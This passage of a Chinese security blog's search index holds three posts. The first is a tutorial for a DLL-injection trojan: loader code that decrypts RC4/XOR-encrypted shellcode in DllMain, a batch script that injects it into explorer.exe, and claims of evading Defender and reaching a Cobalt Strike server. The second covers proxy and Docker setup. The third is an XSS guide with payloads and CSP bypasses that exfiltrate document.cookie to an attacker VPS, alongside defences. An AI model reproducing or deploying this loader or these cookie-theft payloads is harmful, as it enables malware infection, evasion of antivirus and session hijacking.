std::ios::binary); spellfile.seekg(0, std::ios::end); int length = spellfile.tellg(); spellfile.seekg(0, std::ios::beg); char* spelldata = new char[length]; spellfile.read(spelldata, length); spellfile.close(); spelldata = spellRC4(spelldata, length); spelldata = spellXOR(spelldata, length); cast_spell_3(spelldata, length); delete[] spelldata; } // 线程函数 DWORD WINAPI ThreadProc(LPVOID lpParameter) { RunShellcode(); return 0; } // 清理资源函数 void CleanupResources() { if (hFile != INVALID_HANDLE_VALUE) { CloseHandle(hFile); hFile = INVALID_HANDLE_VALUE; } } // DLL入口点 BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) { switch (ul_reason_for_call) { case DLL_PROCESS_ATTACH: hThread = CreateThread(NULL, 0, ThreadProc, NULL, 0, NULL); if (hThread == NULL) { std::cerr \u0026lt;\u0026lt; \u0026#34;Error creating thread: \u0026#34; \u0026lt;\u0026lt; GetLastError() \u0026lt;\u0026lt; std::endl; return FALSE; } break; case DLL_THREAD_ATTACH: case DLL_THREAD_DETACH: break; case DLL_PROCESS_DETACH: if (hThread != NULL) { WaitForSingleObject(hThread, INFINITE); CloseHandle(hThread); hThread = NULL; } CleanupResources(); break; } return TRUE; } 静态免杀思路就是shellcode分离与加密，所以需要同步配置一个p64e.bin文件\nbat脚本实现注入 链接生成dll后，使用bat脚本进行注入。注入基本思路是\n获取x64进程的pid 获取dll木马绝对路径 执行dll注入器，将dll木马注入到目标进程中 runme.bat 1 2 3 4 5 6 7 8 9 10 @echo off setlocal set \u0026#34;target_process_name=explorer.exe\u0026#34; set \u0026#34;dll_name=Loader.dll\u0026#34; set \u0026#34;injecter=inject_dll_amd64.exe\u0026#34; for /f \u0026#34;tokens=2\u0026#34; %%i in (\u0026#39;tasklist ^| findstr /i \u0026#34;%target_process_name%\u0026#34;\u0026#39;) do set \u0026#34;pid=%%i\u0026#34; set \u0026#34;command=%CD%\\%injecter% %pid% %CD%\\%dll_name%\u0026#34; :: 处理引号 执行 \u0026#34;%CD%\\%injecter%\u0026#34; %pid% \u0026#34;%CD%\\%dll_name%\u0026#34; 测试结果 dll VT检测结果 2/75 注入notepad.exe，绕过 df 上线 cs 弹出计算器 也能注入explorer.exe，但是需要注意的是注入一次过后，需要重启才能注入第二次。\ncredicts https://payloads.online/archivers/2023-09-08/vscode-dll/\n","permalink":"http://3lizabeth.fun/posts/study/dll_inject1/","summary":"DLL 注入式木马 认识 DLL注入即通过注入器向正在运行中的程序注入新的DLL，使其自动调用该DLL从而触发DLL中的功能。DLL被加载到进程后会自","title":"基于已签名dll注入器的dll注入木马"},{"content":"使用 clash 配置 linux 代理 1.获取clash-for-linux 1 git clone https://github.com/wnlen/clash-for-linux.git 2.添加订阅 1 2 cd clash-for-linux sudo vim .env CLASH_SECRET是dashboard链接密钥，可以置空，后面启动时会随机生成\n3.启动服务 1 sudo bash start.sh 启动成功有以下回显\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 $ sudo bash start.sh 正在检测订阅地址... Clash订阅地址可访问！ [ OK ] 正在下载Clash配置文件... 配置文件config.yaml下载成功！ [ OK ] 正在启动Clash服务... 服务启动成功！ [ OK ] Clash Dashboard 访问地址：http://\u0026lt;ip\u0026gt;:9090/ui Secret：xxxxxxxxxxxxx 请执行以下命令加载环境变量: source /etc/profile.d/clash.sh 请执行以下命令开启系统代理: proxy_on 若要临时关闭系统代理，请执行: proxy_off 执行命令\n1 2 source /etc/profile.d/clash.sh proxy_on 检查服务端口\n1 2 3 4 5 $ netstat -tln | grep -E \u0026#39;9090|789.\u0026#39; tcp 0 0 127.0.0.1:9090 0.0.0.0:* LISTEN tcp6 0 0 :::7890 :::* LISTEN tcp6 0 0 :::7891 :::* LISTEN tcp6 0 0 :::7892 :::* LISTEN 检查环境变量\n1 2 3 $ env | grep -E \u0026#39;http_proxy|https_proxy\u0026#39; http_proxy=http://127.0.0.1:7890 https_proxy=http://127.0.0.1:7890 以上步骤如果正常，说明服务clash程序启动成功。\n4.Web仪表盘管理 访问http://\u0026lt;ip\u0026gt;:9090/ui\n在API Base URL一栏中输入：http://\u0026lt;ip\u0026gt;:9090 ，在Secret(optional)一栏中输入启动成功后输出的Secret。\n点击Add并选择刚刚输入的管理界面地址，之后便可在浏览器上进行一些配置，如更换节点等。\n手动更改配置则需要修改配置文件\n1 sudo vim conf/config.yaml 可以更改代理模式、代理端口等\n更改配置后需重启服务\n1 2 cd clash-for-linux sudo bash restart.sh 5.验证 需要提前开放代理端口（默认7890、7891、7892）\n1 http_proxy http://127.0.0.1:7890 wget www.google.com 观察wget中是否有通过代理去访问。如可正常访问，则代理功能正常\n6.服务的开关与重启 1 2 3 4 5 6 7 cd clash-for-linux sudo bash start.sh sudo bash shutdown.sh sudo bash restart.sh 如关闭了服务，需手动关闭代理 proxy_off 安装docker 1.更新依赖 不使用代理无法访问download.docker.com，使用代理后阿里云镜像居然还报502\n果断换源\n先备份原镜像源\n1 sudo mv /etc/apt/sources.list /etc/apt/sources.list.old 直接复制，更换为官方debian源\n1 2 3 4 5 6 7 8 9 10 11 12 13 sudo cat \u0026gt; /etc/apt/sources.list \u0026lt;\u0026lt; EOF deb http://deb.debian.org/debian/ bullseye main contrib non-free deb-src http://deb.debian.org/debian/ bullseye main contrib non-free deb http://deb.debian.org/debian/ bullseye-updates main contrib non-free deb-src http://deb.debian.org/debian/ bullseye-updates main contrib non-free deb http://deb.debian.org/debian/ bullseye-backports main contrib non-free deb-src http://deb.debian.org/debian/ bullseye-backports main contrib non-free deb http://deb.debian.org/debian-security/ bullseye-security main contrib non-free deb-src http://deb.debian.org/debian-security/ bullseye-security main contrib non-free EOF 运行更新\n1 2 3 4 5 sudo apt update #更新源 sudo apt upgrade -y #更新已安装的包 sudo apt dist-upgrade #升级系统 sudo apt clean \u0026amp;\u0026amp; sudo apt autoclean #清理下载文件的存档 sudo apt install curl vim wget gnupg dpkg apt-transport-https lsb-release ca-certificates #常用软件包 2.添加GPG密钥与源 为何添加密钥，此为AI的解释：\n加入 Docker 的 GPG 公钥和 apt 源：\n1 2 sudo curl -sSL https://download.docker.com/linux/debian/gpg | gpg --dearmor \u0026gt; /usr/share/keyrings/docker-ce.gpg sudo echo \u0026#34;deb [arch=$(dpkg --print-architecture) signed-by=/usr/share/keyrings/docker-ce.gpg] https://download.docker.com/linux/debian $(lsb_release -sc) stable\u0026#34; \u0026gt; /etc/apt/sources.list.d/docker.list 3.安装docker 更新系统后安装 Docker CE 和 Docker Compose 插件：\n1 2 sudo apt update sudo apt install docker-ce docker-ce-cli containerd.io docker-compose-plugin docker近期更新后，将dockercompose的功能整合进了docker中，可以直接使用 docker compose 即可调用\n此时可以使用 docker version 命令与docker compose version检查是否安装成功：\n有些功能并非完全互通，若某些镜像或命令不兼容，可再单独安装docker-compose\n可以使用 Docker 官方的 github 直接安装最新版本：\n1 2 curl -L https://github.com/docker/compose/releases/latest/download/docker-compose-Linux-x86_64 \u0026gt; /usr/local/bin/docker-compose chmod +x /usr/local/bin/docker-compose 使用docker-compose version命令检查是否安装成功\n4.修改 Docker 配置 以下配置会增加一段自定义内网 IPv6 地址，开启容器的 IPv6 功能，以及限制日志文件大小，防止 Docker 日志塞满硬盘 (泪的教训)：\n1 2 3 4 5 6 7 8 9 10 11 12 13 cat \u0026gt; /etc/docker/daemon.json \u0026lt;\u0026lt; EOF { \u0026#34;log-driver\u0026#34;: \u0026#34;json-file\u0026#34;, \u0026#34;log-opts\u0026#34;: { \u0026#34;max-size\u0026#34;: \u0026#34;20m\u0026#34;, \u0026#34;max-file\u0026#34;: \u0026#34;3\u0026#34; }, \u0026#34;ipv6\u0026#34;: true, \u0026#34;fixed-cidr-v6\u0026#34;: \u0026#34;fd00:dead:beef:c0::/80\u0026#34;, \u0026#34;experimental\u0026#34;:true, \u0026#34;ip6tables\u0026#34;:true } EOF 4.加入开机自启，重启 1 2 systemctl enable docker systemctl restart docker 后记 Debian 12 / Ubuntu 24.04 安装 Docker 以及 Docker Compose 教程\nhttps://u.sb/debian-install-docker/\n","permalink":"http://3lizabeth.fun/posts/study/server_basic_build/","summary":"使用 clash 配置 linux 代理 1.获取clash-for-linux 1 git clone https://github.com/wnlen/clash-for-linux.git 2.添加订阅 1 2 cd clash-for-linux sudo vim .env CLASH_SECRET是dashboard链接密钥","title":"clash-for-Linux的简单配置与docker安装"},{"content":"XSS的原理、利用方式及防护 XSS 原理 XSS 攻击是指，通过执行恶意脚本，以实现窃取用户登陆态、劫持会话等目的的攻击方式。恶意脚本的输入源有，Cookies、Post 表单、Get 请求、HTTP 头内容等。通常，我们将一段 XSS 攻击的代码片段称之为 XSS 向量。\n常见的 XSS 攻击类型有：\n反射型 XSS 。直接将 XSS 向量拼接在 URL 中，诱导用户点击。 存储型 XSS 。通过表单，将 XSS 向量提交到数据库。当页面展示数据时，执行 XSS 向量。 DOM Based XSS 。通过修改浏览页面的 DOM ，绕过防御规则，执行恶意脚本，达到攻击目的。 基础的payload就这几种见如下表（当然还有很多，这里列出部分）\n1 2 3 4 5 6 7 8 9 10 11 12 13 \u0026lt;script\u0026gt;alert(1)\u0026lt;/script\u0026gt; \u0026lt;img scr=1 onerror=alert(1)\u0026gt; \u0026lt;svg onload=alert(1)/\u0026gt; \u0026lt;a href=javascript:alert(1)\u0026gt;xss\u0026lt;/a\u0026gt; ..... 插入超链接 \u0026lt;a href=\u0026#34;https://www.baidu.com/\u0026#34;\u0026gt;Click Me\u0026lt;/a\u0026gt; 则有\u0026lt;a href=\u0026#34;javascript:prompt(document.cookie)\u0026#34;\u0026gt;a\u0026lt;/a\u0026gt; 插入图片 \u0026lt;img src=\u0026#34;https://www.baidu.com/1.png\u0026#34; alt=\u0026#34;Click Me\u0026#34;\u0026gt; 则有\u0026lt;img src=\u0026#34;https://example.com\u0026#34; onerror=alert(1)\u0026gt; 反射型XSS 脚本通过用户提交执行，并没有写入数据库，所以是非持续的，只有提交了相应的url,才会执行javascript脚本。 例如：\n1 2 3 \u0026lt;?php echo $_ GET[\u0026#39;test\u0026#39;]; ?\u0026gt; 访问:\n1 127.0.0.1/test/xss.php?test=\u0026lt;script\u0026gt;alert(1)\u0026lt;/script\u0026gt; 会发现代码被直接输出并被浏览器解析，弹出了一个弹窗\n储存型XSS 通过某种方式将js代码写入数据库中，并在输出界面输出，达到执行js代码的效果。\n最常见的例子是留言板，有的留言板不加过滤，就可以将js代码写入到数据库中，就可以通过这个留言板界面盗取用户的cookie，甚至一些更严重的事。\nXSS常见场景 XSS依赖输出，所以找到输出位置是很重要的，可以输入后查看源代码找找位置\nHTML标签之间，如出现在\u0026lt;div\u0026gt;[输出]/\u0026lt;/div\u0026gt;的位置上 当遇到一些优先级较高的html标签或者在标签中，如\u0026lt;textarea\u0026gt;\u0026lt;/textarea\u0026gt;、\u0026lt;title\u0026gt;\u0026lt;/title\u0026gt;、\u0026lt;iframe\u0026gt;\u0026lt;/iframe\u0026gt;等等，就要先闭合相应的标签，再插入js代码。\nHTML标签之内，如出现在 \u0026lt;input value='[输出]'/\u0026gt; 的位置上 可以闭合标签，事件触发或者用伪协议的方式执行js代码\n1 2 3 4 5 6 /\u0026gt; \u0026lt;script\u0026gt;alert(1);\u0026lt;/script\u0026gt; \u0026lt;input value= clickmouse=alert(1) x= javascript:alert(1)// data:text/html;base64, PHNjcmlwdD5hbGVydCgxKTs8L3NjcmlwdD4= 成为JavaScript代码的值，在\u0026lt;script\u0026gt;var a='[输出];'\u0026lt;/script\u0026gt;的位置上 闭合标签、直接引用代码中的变量。\n1 2 3 ;\u0026lt;/script\u0026gt;\u0026lt;script\u0026gt;alert(1);\u0026lt;/script\u0026gt;\u0026lt;script\u0026gt;a= \u0026#34;;alert(1);// \u0026lt;/script\u0026gt;\u0026lt;script\u0026gt;alert(1)// 成为CSS代码的值，出现在\u0026lt;style\u0026gt;body{color:[输出];}\u0026lt;/style\u0026gt;的位置上 常存在于ie中\n1 1;xss:expression(if(!window.x){alert(1);window.x=1;}) 文件上传xss 文件上传当中，修改后缀名为.html，.htm然后在文件内容当中插入XSS代码\n\u0026ndash;在进行文件上传时进行抓包\n\u0026ndash;修改数据包当中文件后缀为html或者htm\n\u0026ndash;在文件内容当中插入XSS语句\n\u0026ndash;放包，观察弹窗\n也可以在svg写入xss（若网站支持svg格式的文件进行上传的话，可以上传带有XSS的svg文件）\n图片也可以写入xss代码（使用exiftool）\nXSS的绕过 **宽字节注入 **%bf\\、%df、%81\nCRLF注入——利用\\r\\n在http响应头注入回车换行符，并注入X-XSS-Protection: 0\nReferer同源策略——添加Referer，同源站点有的XSS-Filter不过滤\n特殊字符绕过——/代替空格、反引号`代替括号\n编码绕过——JavaScript(unicode)编码、HTML实体编码\n标签绕过：\n假如所有HTML标签都被过滤，可以尝试自定义标签来进行绕过。\n锚点：#可以迅速定位到某个id,或者class的位置，只要能让锚点指向到我们自定义标签，然后在自定义标签当中写入onfocus事件就可以直接完成XSS。\n首先写入一个自定义标签的XSS，注意标注id值，与tabIndex的值\n1 \u0026lt;qweasd id=\u0026#39;qweasd\u0026#39; onfocus=alert(1) tabIndex=1\u0026gt; tabIndex的作用见：tabindex - HTML（超文本标记语言） | MDN (mozilla.org)，主要目的是让自定义标签获得focus\n在GET请求最后追加上锚点+id值，直接进行访问即可。\n1 https://xxxxx.com?id=\u0026lt;qweasd id=\u0026#39;qweasd\u0026#39; onfocus=alert(1) tabIndex=1\u0026gt;#qweasd 假如是存储型XSS可以直接进行加上锚点访问。\n解决方案：禁止\u0026lt;\u0026gt;的输入或者进行HTML编码\nXSS的防护 防御 XSS 攻击，主要是对文本内容进行 XSS Filter，阻止恶意脚本的执行。\nXSS 过滤主要有两种模式：黑名单和白名单。\n基于黑名单的 XSS 过滤，将转义或移除黑名单中的标签和属性。 基于白名单的 XSS 过滤，仅允许白名单中的标签和属性存在，其他全部转义或移除。 由于 XSS 的复杂多变，无法穷举全部 XSS 攻击向量，基于黑名单的 XSS Filter 不够安全。而基于白名单的 XSS Filter ，需要穷举允许的全部标签和属性，配置繁琐。这也是为什么 XSS 如此泛滥的原因：没有一个能低成本实施、对用户输入无影响的 XSS 防御方案。\n另外一种预防的方式就是阻止恶意脚本的执行。也就是允许恶意脚本存在，但是不允许其执行。例如，在 Vuejs 中，v-text 指令会将 XSS 向量展示在页面上，不执行 XSS 向量，也就不会触发攻击行为。但是，当允许用户输入样式时，我们会使用 v-html 指令将用户输入的内容显示在页面上。这就可能导致 XSS 攻击。我们需要进一步的防御措施。\n前后端穷举有限标签和属性，进行白名单过滤\n后端转义存储，前端展示时，进行黑名单过滤\n实际上，普通用户不会输入 XSS 向量，而攻击者可以很轻松地使用 Postman 或 Burp Suite 进行安全测试。第二种思路是，完全不信任数据输入，但又不能破坏用户数据。于是，直接将用户输入的数据转义入库，然后反转义输出，保证数据库中的内容是可信任的。展示数据时，前端对展示的内容进行基于黑名单的过滤，推荐使用 js-xss 。\n适用场景：对输入标签范围不定，富文本编辑功能复杂。\nHTTP头防护 设置以下的响应头\nX-XSS-Protection\n1 2 3 通过设置其值为1，启用浏览器的XSS防护，浏览器会做出下面的措施： 自动关闭或过滤掉潜在的XSS攻击脚本：浏览器会检测响应内容是否包含恶意脚本，并自动关闭或过滤掉这些脚本，防止它们被执行。 重定向到安全页面：如果浏览器检测到具有潜在XSS威胁的内容，它可能会将用户重定向到一个更安全的页面，以防止攻击脚本的执行。 X-Download-Options\n1 通过设置其值为noopen，使得浏览器下载文件时不自动打开，不关联下载文件和浏览器内嵌程序。这样可以防止一些特定类型的文件（例如html、pdf等）被当作网页打开，降低XSS攻击的风险。 X-Content-Type-Options\n1 通过设置X-Content-Type-Options头的值为\u0026#34;nosniff\u0026#34;，可以防止浏览器将响应内容以错误的方式解析，减少了XSS攻击的风险。 X-Frame-Options\n1 通过设置X-Frame-Options头，可以阻止通过嵌入iframe或frame的方式进行点击劫持攻击。可以设置该头的值为\u0026#34;DENY\u0026#34;，\u0026#34;SAMEORIGIN\u0026#34;或\u0026#34;ALLOW-FROM \u0026lt;域名\u0026gt;\u0026#34;。 Content Security Policy（CSP）（meta标签等）\n1 通过设置CSP头，可以限制资源加载的来源，以防止执行不受信任的脚本。CSP可以指定允许的域名、允许的脚本类型以及其他安全策略。 HttpOnly 当一个 cookie 设置了 HttpOnly 标志后，浏览器会禁止通过 JavaScript 脚本来读取这个 cookie 的值。这意味着即使有 XSS 攻击成功注入了恶意脚本，也无法从受害者浏览器中获取敏感的 cookie 值，从而有效防止了 cookie 盗取和会话劫持攻击。\n但是HttpOnly不能够完全防御XSS，只能减少XSS带来的危害。\nCSP同源策略 除了在内容上使用 XSSFilter 进行过滤，还可以使用 HttpOnly、CSP 头部进一步预防 XSS 攻击。\nCSP (Content Security Policy) 是用来防御 XSS 的安全策略。CSP 通过白名单控制，仅允许加载指定的资源。这些资源包括 JavaScript, CSS, HTML, Frames, fonts, image, embeddable object, Java applets, ActiveX, audio 和 video 等。\n有两种方法可以启用 CSP :\n设置 HTTP 头信息的 Content-Security-Policy 字段 在网页添加 \u0026lt;meta\u0026gt; 标签 配置示例：\n只允许同源下的资源\n1 Content-Security-Policy: default-src \u0026#39;self\u0026#39;; 允许同源以及指定地址的 JS 资源\n1 Content-Security-Policy: script-src \u0026#39;self\u0026#39; www.google-analytics.com ajax.googleapis.com; 多个资源时，后面的会覆盖前面的\n1 Content-Security-Policy: default-src \u0026#39;none\u0026#39;; script-src \u0026#39;self\u0026#39;; connect-src \u0026#39;self\u0026#39;; img-src \u0026#39;self\u0026#39;; 富文本情景下对XSS的防护 富文本环境下，传统的html编码转移与特殊字符过滤是不大可行的。富文本的情况和我们平常遇到的一些 XSS 案例不一样，不是简单的在输出位置做针对性过滤就行的，因为既然提供富文本编辑器，那么肯定是内容需要支持某些标签输入输出，如果 XSS FILTER 直接干掉了标签，会影响到内容的展示，所以有必要对富文本情况拎出来单独处理。\n有人说用黑名单处理，过滤掉那些危险的标签，那么你会掉进一个有无限 case 要处理的坑里，暂且不说能把现有的危险标签罗列完整，H5 出来后新增的那些标签特性简直就是噩梦。另外，就算考虑再周到，也要知道这个世界上还有一款浏览器叫做 IE，奇葩的解析方式简直让人防不胜防，完全不按套路出牌。\n既然黑名单不适合，那么自然就想到白名单的方式，这是目前来说比较好的防御富文本 XSS 方式。具体工作分以下几个方面：\n确定白名单 解析 DOM 树，非白名单直接丢弃 白名单过滤器编写较为麻烦且考虑难免不周到，为了安全性与因此多使用业界成熟的过滤器。\n服务端过滤（html解析器） jsoup\njsoup 是一款 Java 的 HTML 解析器，可直接解析某个 URL 地址、HTML 文本内容。它提供了一套非常省力的 API，可通过 DOM、CSS 以及类似于 JQuery 的操作方法来取出和操作数据。基于MIT协议发布，可放心用于商业项目。\njsoup内置了一些白名单的标签属性list，同时支持用户自定义，或者在此基础上根据需求灵活扩展。\nOWASP Java HTML Sanitizer\nOWASP Java HTML Sanitizer 是OWASP（Open Web Application Security Project，开放Web应用程序安全项目）组织开源的一款HTML过滤器，为安全而生，使用起来非常灵活。\n其他服务端开发语言过滤组件\n.NET：https://github.com/mganss/HtmlSanitizer Golang：https://github.com/microcosm-cc/bluemonday PHP：http://htmlpurifier.org/ Python：https://pypi.python.org/pypi/bleach Django框架（Python）：https://github.com/shaowenchen/django-xss-cleaner\n前端过滤 js-xss\n前端将数据渲染到页面呈现之前，也可以对内容进行一次过滤。这里推荐使用js-xss模块。除了可以在页面里直接引入js使用，同时也支持node.js，当使用node.js做服务端时，也可以参照前面的方案，在数据传入时使用该模块进行过滤。\n源码：https://github.com/leizongmin/js-xss 项目主页： http://jsxss.com\n标签属性安全使用建议 1、href、src属性需要校验协议 如果未校验，攻击者可以使用javascript:伪协议插入执行恶意的js代码。\n2、什么情况a标签要加rel=”nofollow”属性？\n这个属性的意思是告诉搜索引擎不要追踪此链接。如果A网页上有一个链接指向B网页，但A网页给这个链接加上了rel=”nofollow” 标注，那么搜索引擎不会把A网页计算入B网页的反向链接。搜索引擎看到这个属性就会取消链接的投票权重。\n简单来讲，有些搞SEO的人，会在各大网站插入很多带有超链接的垃圾信息，如果强制加了rel=“nofollow”属性，搜索引擎爬到了，也不会给对方增加权重。这样搞恶意SEO的人，就没兴趣在你的网站里插垃圾信息了。\n所以要不要加这个属性，取决于你的业务是否需要防止上述情形。\n3、哪些属性被认为是安全的？\n1 align, alink, alt, bgcolor, border, cellpadding, cellspacing, class, color, cols, colspan, coords, dir, face, height, hspace, ismap, lang, marginheight, marginwidth, multiple, nohref, noresize, noshade, nowrap, ref, rel, rev, rows, rowspan, scrolling, shape, span, summary, tabindex, title, usemap, valign, value, vlink, vspace, width. 以上是OWASP整理的安全属性，可以放心使用。参考： https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html\n4、iframe标签安全使用建议\n建议不要使用，如果一定要用，可以通过下面几个方式降低风险：\nsrc属性必须校验协议，限制http和https，同时进行url白名单正则校验，限制内容为可信域名，防止攻击者插入恶意页面。 固定长宽，或限制最大长宽，防止子页面覆盖父页面。 使用沙箱（sandbox）机制，遵循权限最小化原则配置相应选项满足业务需求。 sandbox 详细可参考 iframe特性全解读： https://zhuanlan.zhihu.com/p/88809313 sandbox 属性：https://www.bookstack.cn/read/html-tutorial/spilt.2.docs-iframe.md\n5、style属性，建议不要使用。\n原因参考：基于css注入的向量https://html5sec.org/#css 如果需要支持用户控制样式，建议使用class属性，针对不同的值提前定好对应的样式。\n实在非要使用style属性的话，那就自己把属性值提取出来，解析后再做一层白名单过滤吧（如果写不好，会存在绕过的可能）。\n6、script标签严禁用户插入，这个相信不用解释了。\n其他常见场景、对应问题和解决方案 1、富文本内容被WAF（Web应用防火墙）拦截 有些公司的WAF规则比较严格，对请求中包含某些标签内容的，会直接判定为攻击，进行拦截。\n通常WAF是站在企业整体安全的角度去做防护的，不能因为业务的某一个功能点，去降低整体的防护能力。这时，可以考虑使用以下方案去满足业务需求：\n图中蓝色线条是在原有常规方案基础上的改动。即在前端解析富文本内容的DOM树，转换为json格式，之后提交给服务端，服务端进行白名单过滤。\nhtml和json的转换，可以考虑使用类似html2json功能的组件来实现： https://github.com/Jxck/html2json\n注意，这种方案绕过了WAF的防护，请务必保证白名单策略的安全！请务必保证白名单策略的安全！请务必保证白名单策略的安全！\n2、内容来自文件导入 有的业务场景，需要从文件批量导入内容，并且内容还要支持富文本，流程如下：\n这种场景下，可以在服务端提取到内容后对富文本内容进行白名单过滤，之后再进行持久化存储。对于业务上不需要支持富文本的字段，直接按照传统XSS的防护方案进行特殊字符转义就好。\nCSP的绕过 参考文章 1 https://xz.aliyun.com/t/5084?time__1311=n4%2BxnD07iti%3DFq7q7KDsA3xCqobFDBGD9QEhYD\u0026amp;alichlgref=https%3A%2F%2Fxz.aliyun.com%2Ft%2F12890%3Ftime__1311%3Dmqmhq%252BxjhiGKDsD7GY0%253DdnDWw1Y5C9eD%26alichlgref%3Dhttps%253A%252F%252Fwww.google.com.hk%252F#toc-0 CSP的绕过从CSP的诞生开始就一直被前端的安全研究人员所热衷，本文总结一些我了解到的CSP的绕过方式，若有不足，敬请批评补充\nlocation.href CSP不影响location.href跳转，因为当今大部分网站的跳转功能都是由前端实现的，CSP如果限制跳转会影响很多的网站功能。所以，用跳转来绕过CSP获取数据是一个万能的办法，虽然比较容易被发现，但是在大部分情况下对于我们已经够用 当我们已经能够执行JS脚本的时候，但是由于CSP的设置，我们的cookie无法带外传输，就可以采用此方法，将cookie打到我们的vps上\n1 location.href = \u0026#34;vps_ip:xxxx?\u0026#34;+document.cookie 有人跟我说可以跳过去再跳回来，但是这样不是会死循环一直跳来跳去吗2333333 利用条件:\n可以执行任意JS脚本，但是由于CSP无法数据带外 link标签导致的绕过 这个方法其实比较老，去年我在我机器上试的时候还行，现在就不行了 因为这个标签当时还没有被CSP约束，当然现在浏览器大部分都约束了此标签，但是老浏览器应该还是可行的。 所以我们可以通过此标签将数据带外\n1 2 3 4 5 \u0026lt;!-- firefox --\u0026gt; \u0026lt;link rel=\u0026#34;dns-prefetch\u0026#34; href=\u0026#34;//${cookie}.vps_ip\u0026#34;\u0026gt; \u0026lt;!-- chrome --\u0026gt; \u0026lt;link rel=\u0026#34;prefetch\u0026#34; href=\u0026#34;//vps_ip?${cookie}\u0026#34;\u0026gt; 当然这个是我们写死的标签，如何把数据带外？\n1 2 3 4 var link = document.createElement(\u0026#34;link\u0026#34;); link.setAttribute(\u0026#34;rel\u0026#34;, \u0026#34;prefetch\u0026#34;); link.setAttribute(\u0026#34;href\u0026#34;, \u0026#34;//vps_ip/?\u0026#34; + document.cookie); document.head.appendChild(link); 这样就可以把cookie带外了 利用条件:\n可以执行任意JS脚本，但是由于CSP无法数据带外 使用Iframe绕过 当一个同源站点，同时存在两个页面，其中一个有CSP保护的A页面，另一个没有CSP保护B页面，那么如果B页面存在XSS漏洞，我们可以直接在B页面新建iframe用javascript直接操作A页面的dom，可以说A页面的CSP防护完全失效 A页面:\n1 2 3 4 \u0026lt;!-- A页面 --\u0026gt; \u0026lt;meta http-equiv=\u0026#34;Content-Security-Policy\u0026#34; content=\u0026#34;default-src \u0026#39;self\u0026#39;; script-src \u0026#39;self\u0026#39;\u0026#34;\u0026gt; \u0026lt;h1 id=\u0026#34;flag\u0026#34;\u0026gt;flag{0xffff}\u0026lt;/h1\u0026gt; B页面:\n1 2 3 4 5 6 7 8 9 10 11 \u0026lt;!-- B页面 --\u0026gt; \u0026lt;!-- 下面模拟XSS --\u0026gt; \u0026lt;body\u0026gt; \u0026lt;script\u0026gt; var iframe = document.createElement(\u0026#39;iframe\u0026#39;); iframe.src=\u0026#34;A页面\u0026#34;; document.body.appendChild(iframe); setTimeout(()=\u0026gt;alert(iframe.contentWindow.document.getElementById(\u0026#39;flag\u0026#39;).innerHTML),1000); \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; setTimeout是为了等待iframe加载完成 利用条件:\n一个同源站点内存在两个页面，一个页面存在CSP保护，另一个页面没有CSP保护且存在XSS漏洞 我们需要的数据在存在CSP保护的页面 用CDN来绕过 一般来说，前端会用到许多的前端框架和库，部分企业为了减轻服务器压力或者其他原因，可能会引用其他CDN上的JS框架，如果CDN上存在一些低版本的框架，就可能存在绕过CSP的风险 这里给出orange师傅绕hackmd CSP的文章Hackmd XSS 案例中hackmd中CSP引用了cloudflare.com CDN服务，于是orange师傅采用了低版本的angular js模板注入来绕过CSP，如下\n1 2 3 4 5 6 7 \u0026lt;meta http-equiv=\u0026#34;Content-Security-Policy\u0026#34; content=\u0026#34;default-src \u0026#39;self\u0026#39;; script-src \u0026#39;unsafe-eval\u0026#39; https://cdnjs.cloudflare.com;\u0026#34;\u0026gt; \u0026lt;!-- foo=\u0026#34;--\u0026gt; \u0026lt;script src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.min.js\u0026gt; \u0026lt;/script\u0026gt; \u0026lt;div ng-app\u0026gt; {{constructor.constructor(\u0026#39;alert(document.cookie)\u0026#39;)()}} \u0026lt;/div\u0026gt; 这个是存在低版本angular js的cdn服务商列表 https://github.com/google/csp-evaluator/blob/master/whitelist_bypasses/angular.js#L26-L76 除了低版本angular js的模板注入，还有许多库可以绕过CSP 下面引用https://www.jianshu.com/p/f1de775bc43e 如果用了Jquery-mobile库，且CSP中包含\u0026quot;script-src \u0026lsquo;unsafe-eval\u0026rsquo;\u0026ldquo;或者\u0026quot;script-src \u0026lsquo;strict-dynamic\u0026rsquo;\u0026quot;，可以用此exp\n1 \u0026lt;div data-role=popup id=\u0026#39;\u0026lt;script\u0026gt;alert(1)\u0026lt;/script\u0026gt;\u0026#39;\u0026gt;\u0026lt;/div\u0026gt; 还比如RCTF2018题目出现的AMP库,下面的标签可以获取名字为FLAG的cookie\n1 \u0026lt;amp-pixel src=\u0026#34;http://your domain/?cid=CLIENT_ID(FLAG)\u0026#34;\u0026gt;\u0026lt;/amp-pixel\u0026gt; blackhat2017有篇ppt总结了可以被用来绕过CSP的一些JS库 https://www.blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf 利用条件:\nCDN服务商存在某些低版本的js库 此CDN服务商在CSP白名单中 站点可控静态资源绕过 给一个绕过codimd的(实例)codimd xss 案例中codimd的CSP中使用了www.google-analytics.com 而www.google.analytics.com中提供了自定义javascript的功能（google会封装自定义的js，所以还需要unsafe-eval），于是可以绕过CSP\n1 2 \u0026lt;meta http-equiv=\u0026#34;Content-Security-Policy\u0026#34; content=\u0026#34;default-src \u0026#39;self\u0026#39;; script-src \u0026#39;unsafe-eval\u0026#39; https://www.google-analytics.com\u0026#34;\u0026gt; \u0026lt;script src=\u0026#34;https://www.google-analytics.com/gtm/js?id=GTM-PJF5W64\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; 同理，若其他站点下提供了可控静态资源的功能，且CSP中允许了此站点，则可以采用此方式绕过 利用条件:\n站点存在可控静态资源 站点在CSP白名单中 站点可控JSONP绕过 JSONP的详细介绍可以看看我之前的一篇文章https://xz.aliyun.com/t/4470 大部分站点的jsonp是完全可控的，只不过有些站点会让jsonp不返回html类型防止直接的反射型XSS，但是如果将url插入到script标签中，除非设置x-content-type-options头，否者尽管返回类型不一致，浏览器依旧会当成js进行解析 以ins\u0026rsquo;hack 2019/的bypasses-everywhere这道题为例，题目中的csp设置了www.google.com\n1 2 3 参考文献 xss 向量大全 https://html5sec.org/ ","permalink":"http://3lizabeth.fun/posts/study/xss_basic/","summary":"XSS的原理、利用方式及防护 XSS 原理 XSS 